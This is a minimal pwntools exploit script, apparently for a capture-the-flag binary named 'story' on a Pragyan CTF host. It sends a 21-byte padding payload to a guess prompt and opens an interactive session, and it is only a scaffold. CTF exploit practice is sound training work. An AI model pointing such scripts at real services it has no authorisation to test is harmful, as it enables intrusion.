# -- coding: utf-8 --
from pwn import *
import time
from ctypes import CDLL
context.log_level = 'debug'
# ENV
PORT =  6004
HOST = "story.ctf.pragyan.org"

e = context.binary = ELF('./story')
# lib = ELF('libc-2.31.so')
lib = e.libc
# if len(sys.argv) > 1 and sys.argv[1] == 'r':
    # r = remote(HOST, PORT)
# else:
    # r = e.process()
    # pause()

# VARIABLE

# PAYLOAD


r = e.process()
# r = remote(HOST, PORT)
payload =b"a"*21
pause()
r.sendlineafter(b"Enter your guess:",payload)

r.interactive()
